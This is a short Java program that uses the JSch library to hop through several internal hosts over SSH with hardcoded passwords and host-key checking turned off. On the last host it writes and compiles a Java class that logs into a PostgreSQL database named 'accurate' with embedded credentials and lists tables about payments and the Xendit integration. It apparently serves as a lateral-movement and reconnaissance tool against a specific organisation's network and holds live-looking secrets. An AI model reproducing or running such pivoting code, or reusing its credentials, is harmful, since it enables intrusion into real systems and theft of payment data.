import com.jcraft.jsch.*;
import java.io.*;
class XSU {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // From Accurate server, try connecting to DB (Accurate app connects to it)
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.132 'cd /tmp;echo \"import java.sql.*;class ADB2{public static void main(String[] a)throws Exception{Class.forName(\\\"org.postgresql.Driver\\\");Connection c=DriverManager.getConnection(\\\"jdbc:postgresql://10.13.17.248:5501/accurate\\\",\\\"accurate\\\",\\\"BashShell%729#Acc5\\\");System.out.println(\\\"CONNECTED!\\\");Statement s=c.createStatement();ResultSet r=s.executeQuery(\\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\"public\\\\\\\" AND (tablename LIKE \\\\\\\"%%xendit%%\\\\\\\" OR tablename LIKE \\\\\\\"%%payment%%\\\\\\\" OR tablename LIKE \\\\\\\"%%integration%%\\\\\\\" OR tablename LIKE \\\\\\\"%%application%%\\\\\\\") ORDER BY tablename\\\");while(r.next())System.out.println(r.getString(1));c.close();}}\" > ADB2.java;/usr/lib/jvm/java-11-amazon-corretto/bin/javac -cp /progs/accurate/accurate-app/tomcat/8.0.53/webapps/accurate/accurate/WEB-INF/lib/postgresql-*.jar ADB2.java 2>&1;/usr/lib/jvm/java-11-amazon-corretto/bin/java -cp /progs/accurate/accurate-app/tomcat/8.0.53/webapps/accurate/accurate/WEB-INF/lib/postgresql-*.jar:. ADB2 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
